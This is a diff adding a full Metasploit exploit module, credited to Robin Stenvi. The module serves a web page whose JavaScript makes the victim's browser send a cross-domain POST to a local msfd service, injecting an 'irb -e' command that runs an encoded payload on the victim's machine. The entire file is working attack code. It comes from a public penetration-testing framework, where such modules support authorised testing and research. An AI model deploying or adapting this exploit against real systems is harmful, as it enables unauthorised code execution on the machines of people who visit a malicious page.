@@ -1,0 +1,77 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+  include Msf::Exploit::Remote::HttpServer::HTML
+
+  def initialize(info = {})
+    super(update_info(info,
+     'Name'           => 'Metasploit msfd Remote Code Execution via Browser',
+     'Description'    => %q{
+      Metasploit's msfd-service makes it possible to get a msfconsole-like
+      interface over a TCP socket. This module connects to the msfd-socket
+      through the victim's browser.
+
+      To execute msfconsole-commands in JavaScript from a web application,
+      this module places the payload in the POST-data. These POST-requests
+      can be sent cross-domain and can therefore be sent to localhost on the
+      victim's machine. The msfconsole-command to execute code is 'rbi -e
+      "CODE"'.
+
+      Exploitation when the browser is running on Windows is unreliable and
+      the exploit is only usable when IE is used and the quiet-flag has been
+      passed to msf-daemon.
+      },
+      'License'        => BSD_LICENSE,
+      'Author'         => 'Robin Stenvi <robin.stenvi[at]gmail.com>',
+      'Platform'       => 'ruby',
+      'Arch'           => ARCH_RUBY,
+      'Targets'        =>
+        [
+          [ 'Automatic', {}],
+        ],
+      'Payload'        =>
+        {
+          'Space' => 8192,  # Arbitrary limit
+          'DisableNops' =>  'True',
+          'BadChars' => "\x22\x0a"
+        },
+      'DisclosureDate' => 'Apr 11 2018',  # Vendor notification
+      'DefaultTarget'  => 0))
+
+      register_options([
+        OptString.new('REMOTE_IP', [true, 'Remote IP address when called from victim', '127.0.0.1']),
+        OptString.new('REMOTE_PORT', [true, 'Remote port the service is running at', '55554'])
+      ])
+  end
+
+  def exploit
+    super
+  end
+
+  def on_request_uri(cli, request)
+    msg = "#{cli.peerhost.ljust(16)} #{self.shortname}"
+    sc = payload.encoded
+    shellcode = "\\x" + sc.unpack('U'*sc.length).collect {|x| x.to_s 16}.join("\\x")
+    var1 = rand_text_alpha(rand(6..11))
+    var2 = rand_text_alpha(rand(6..11))
+    html =  <<-EOS
+<html>
+<head></head>
+<body>
+<script>
+var #{var1} = new XMLHttpRequest();
+#{var1}.open("POST","http://#{datastore['REMOTE_IP']}:#{datastore['REMOTE_PORT']}/", true);
+var #{var2} = String("#{shellcode}");
+#{var1}.send("irb -e \\"" + #{var2} + "\\"\\n");
+</script>
+</body>
+</html>
+EOS
+    print_status("#{msg} Sending HTML...")
+    send_response(cli, html, { 'Content-Type' => 'text/html' })
+  end
+end
